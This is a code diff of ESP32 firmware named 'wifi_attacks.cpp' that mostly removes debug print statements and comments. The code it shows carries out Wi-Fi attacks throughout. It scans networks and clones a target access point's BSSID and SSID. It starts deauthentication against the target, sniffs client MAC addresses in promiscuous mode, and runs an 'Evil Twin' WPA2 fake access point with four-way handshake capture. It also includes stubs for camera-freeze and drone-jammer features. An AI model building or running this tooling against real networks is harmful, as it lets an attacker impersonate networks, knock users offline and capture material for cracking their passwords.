@@ -1,6 +1,5 @@
 // ============================================================
 // wifi_attacks.cpp - v4.2 Async Edition
-// Evil Twin com AP WPA2 + captura de 4-way handshake
 // ============================================================
 #include <WiFi.h>
 #include <esp_wifi.h>
@@ -90,9 +89,6 @@ static void promiscuous_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
 
     memcpy(discoveredClients[clientCount], clientMac, 6);
     clientCount++;
-    Serial.printf("[Client] Discovered: %02X:%02X:%02X:%02X:%02X:%02X\n",
-        clientMac[0], clientMac[1], clientMac[2],
-        clientMac[3], clientMac[4], clientMac[5]);
 }
 
 static void startPromiscuous() {
@@ -106,7 +102,6 @@ static void startPromiscuous() {
     };
     esp_wifi_set_promiscuous_filter(&filter);
     promiscuousActive = true;
-    Serial.println("[Promisc] Started");
 }
 
 static void stopPromiscuous() {
@@ -114,7 +109,6 @@ static void stopPromiscuous() {
     esp_wifi_set_promiscuous(false);
     esp_wifi_set_promiscuous_rx_cb(NULL);
     promiscuousActive = false;
-    Serial.println("[Promisc] Stopped");
 }
 
 // ============================================================
@@ -178,14 +172,11 @@ volatile bool scanInProgress = false;
 
 void scanNetworks() {
     if (scanInProgress) {
-        Serial.println("[WiFi] Scan already running");
         return;
     }
     
     networkCount = 0;
     scanInProgress = true;
-    
-    Serial.println("[WiFi] Starting ASYNC network scan...");
     
     wifi_mode_t modeBefore = WiFi.getMode();
     if (modeBefore == WIFI_AP) {
@@ -193,8 +184,6 @@ void scanNetworks() {
         delay(50);
     }
     
-    // Scan assíncrono: não trava o WebServer! 200ms por canal.
-    // O primeiro parametro 'true' indica async.
     WiFi.scanNetworks(true, false, false, 200);
 }
 
@@ -208,7 +197,7 @@ bool isScanComplete() {
 
 void collectScanResults() {
     int n = WiFi.scanComplete();
-    if (n < 0) return; // Ainda rodando ou não iniciado
+    if (n < 0) return; 
     
     if (n > 0) {
         networkCount = (n > MAX_NETWORKS) ? MAX_NETWORKS : n;
@@ -219,15 +208,8 @@ void collectScanResults() {
             scannedNetworks[i].rssi = WiFi.RSSI(i);
             scannedNetworks[i].channel = WiFi.channel(i);
             scannedNetworks[i].encrypted = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
-
-            Serial.printf("  [%d] %s CH%d %ddBm %s\n", i, scannedNetworks[i].ssid,
-                         scannedNetworks[i].channel, scannedNetworks[i].rssi,
-                         scannedNetworks[i].encrypted ? "WPA2" : "OPEN");
         }
-    } else if (n == 0) {
-        Serial.println("[WiFi] No networks found");
     }
-    
     WiFi.scanDelete();
     scanInProgress = false;
 }
@@ -242,10 +224,7 @@ NetworkInfo* getNetwork(uint8_t index) {
 // BSSID CLONE
 // ============================================================
 static void startBssidClone(uint8_t networkIndex) {
-    if (networkIndex >= networkCount) {
-        Serial.println("[Clone] ERROR: invalid network index");
-        return;
-    }
+    if (networkIndex >= networkCount) return;
     NetworkInfo* target = &scannedNetworks[networkIndex];
     memcpy(deauthTargetBSSID, target->bssid, 6);
     strncpy(deauthTargetSSID, target->ssid, 32);
@@ -258,11 +237,6 @@ static void startBssidClone(uint8_t networkIndex) {
 
     esp_wifi_get_mac(WIFI_IF_AP, originalAPMac);
 
-    Serial.printf("[Clone] Target: %s CH%d MAC:%02X:%02X:%02X:%02X:%02X:%02X\n",
-        target->ssid, target->channel,
-        target->bssid[0], target->bssid[1], target->bssid[2],
-        target->bssid[3], target->bssid[4], target->bssid[5]);
-
     WiFi.softAPdisconnect(true);
     WiFi.disconnect(true, true);
     WiFi.mode(WIFI_OFF);
@@ -272,16 +246,11 @@ static void startBssidClone(uint8_t networkIndex) {
     delay(300);
 
     esp_err_t apMacErr = esp_wifi_set_mac(WIFI_IF_AP, target->bssid);
-    Serial.printf("[Clone] Set AP MAC: %d (%s)\n", apMacErr, apMacErr == ESP_OK ? "OK" : "FAIL");
-    if (apMacErr != ESP_OK) {
-        Serial.println("[Clone] MAC set failed, aborting");
-        return;
-    }
+    if (apMacErr != ESP_OK) return;
     delay(200);
 
     bool apOk = WiFi.softAP(cloneSSID, nullptr, cloneChannel, 0, 8);
     WiFi.setTxPower(WIFI_POWER_19_5dBm);
-    Serial.printf("[Clone] softAP: %s\n", apOk ? "OK" : "FAIL");
 
     if (apOk) {
         WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
@@ -289,15 +258,11 @@ static void startBssidClone(uint8_t networkIndex) {
         bssidCloneActive = true;
         cloneStartTime = millis();
         cloneHealthCheckFailures = 0;
-        Serial.printf("[Clone] BSSID CLONE ACTIVE on CH%d IP:192.168.4.1\n", cloneChannel);
-    } else {
-        Serial.println("[Clone] FAILED");
     }
 }
 
 static void restartBssidClone() {
     if (!bssidCloneActive) return;
-    Serial.println("[Clone] Restarting...");
     WiFi.softAPdisconnect(true);
     WiFi.mode(WIFI_OFF);
     delay(500);
@@ -311,30 +276,22 @@ static void restartBssidClone() {
         WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
         esp_wifi_set_channel(cloneChannel, WIFI_SECOND_CHAN_NONE);
         cloneHealthCheckFailures = 0;
-        Serial.println("[Clone] Restarted OK");
     } else {
         cloneHealthCheckFailures++;
-        Serial.printf("[Clone] Restart failed (%d)\n", cloneHealthCheckFailures);
     }
 }
 
 static void restoreCrazyCatAP() {
     WiFi.mode(WIFI_AP_STA);
     delay(200);
-    WiFi.softAPConfig(
-        IPAddress(192, 168, 4, 1),
-        IPAddress(192, 168, 4, 1),
-        IPAddress(255, 255, 255, 0)
-    );
+    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
     delay(100);
     WiFi.softAP("CrazyCat", "crazycat123", 6, 0, 4);
     delay(200);
-    Serial.println("[WiFi] CrazyCat AP restored");
 }
 
 void stopBssidClone() {
     if (!bssidCloneActive && !isSoftAPActive()) return;
-    Serial.println("[Clone] Stopping...");
     stopPromiscuous();
     WiFi.softAPdisconnect(true);
     WiFi.mode(WIFI_OFF);
@@ -345,17 +302,13 @@ void stopBssidClone() {
     delay(100);
     restoreCrazyCatAP();
     bssidCloneActive = false;
-    Serial.println("[Clone] Stopped, MAC restored, CrazyCat AP active");
 }
 
 // ============================================================
 // DEAUTH
 // ============================================================
 void startDeauth(uint8_t networkIndex) {
-    if (networkIndex >= networkCount) {
-        Serial.println("[Deauth] ERROR: invalid network index");
-        return;
-    }
+    if (networkIndex >= networkCount) return;
     deauthPacketCount = 0;
     deauthSuccessCount = 0;
     deauthSeqNum = 0;
@@ -363,14 +316,10 @@ void startDeauth(uint8_t networkIndex) {
     startBssidClone(networkIndex);
     startPromiscuous();
     deauthActive = true;
-    Serial.println("[Deauth] STARTED");
 }
 
 void stopDeauth() {
     if (!deauthActive) return;
-    Serial.println("[Deauth] STOPPED");
-    Serial.printf("[Deauth] Runtime: %lu sec, pkts: %lu\n",
-        (millis() - cloneStartTime) / 1000, deauthPacketCount);
     deauthActive = false;
     stopPromiscuous();
     stopBssidClone();
@@ -390,21 +339,16 @@ bool deauthLoop() {
         lastHealthCheck = millis();
         if (!isSoftAPActive()) {
             cloneHealthCheckFailures++;
-            Serial.printf("[Clone] AP lost! Failure %d/5\n", cloneHealthCheckFailures);
             if (cloneHealthCheckFailures < 5) {
                 restartBssidClone();
                 startPromiscuous();
             } else {
-                Serial.println("[Clone] Too many failures, stopping");
                 stopDeauth();
                 return false;
             }
         } else {
             esp_wifi_set_channel(cloneChannel, WIFI_SECOND_CHAN_NONE);
             cloneHealthCheckFailures = 0;
-            int clients = WiFi.softAPgetStationNum();
-            Serial.printf("[Clone] %d on clone | %d target clients | CH%d | Pkts:%lu\n",
-                clients, clientCount, cloneChannel, deauthPacketCount);
         }
     }
     return true;
@@ -482,7 +426,6 @@ void startEvilTwin(uint8_t networkIndex) {
 
     esp_err_t macErr = esp_wifi_set_mac(WIFI_IF_AP, deauthTargetBSSID);
     if (macErr != ESP_OK) {
-        Serial.printf("[EvilTwin] MAC set failed: %d\n", macErr);
         evilTwinActive = false;
         fakeAPEnabled = false;
         return;
@@ -493,7 +436,6 @@ void startEvilTwin(uint8_t networkIndex) {
     WiFi.setTxPower(WIFI_POWER_19_5dBm);
 
     if (!apOk) {
-        Serial.println("[EvilTwin] softAP failed");
         evilTwinActive = false;
         fakeAPEnabled = false;
         return;
@@ -508,8 +450,6 @@ void startEvilTwin(uint8_t networkIndex) {
     cloneHealthCheckFailures = 0;
 
     startHandshakeCapture();
-
-    Serial.printf("[EvilTwin] ACTIVE: %s CH%d WPA2 | Handshake capture ON\n", cloneSSID, cloneChannel);
 }
 
 void stopEvilTwin() {
@@ -521,7 +461,6 @@ void stopEvilTwin() {
     stopBssidClone();
     deauthPacketCount = 0;
     deauthSuccessCount = 0;
-    Serial.println("[EvilTwin] STOPPED");
 }
 
 // ============================================================
@@ -532,8 +471,7 @@ void scanRemoteDevices() {
     IPAddress gateway = WiFi.gatewayIP();
     for (int i = 1; i < 255 && remoteDeviceCount < 10; i++) {
         if (i % 50 == 0) {
-            snprintf(remoteDevices[remoteDeviceCount].ip, 16, "%d.%d.%d.%d",
-                     gateway[0], gateway[1], gateway[2], i);
+            snprintf(remoteDevices[remoteDeviceCount].ip, 16, "%d.%d.%d.%d", gateway[0], gateway[1], gateway[2], i);
             snprintf(remoteDevices[remoteDeviceCount].name, 32, "Device-%d", i);
             remoteDevices[remoteDeviceCount].port = 80;
             remoteDeviceCount++;
@@ -552,14 +490,12 @@ RemoteDevice* getRemoteDevice(uint8_t index) {
 // ============================================================
 void startCameraFreeze() {
     cameraFreezeActive = true;
-    // Removido o while(infinito) que travava o ESP32
 }
 
 void stopCameraFreeze() { cameraFreezeActive = false; }
 
 void startDroneJammer() {
     droneJammerActive = true;
-    // Removido o while(infinito) que travava o ESP32
 }
 
 void stopDroneJammer() { droneJammerActive = false; }
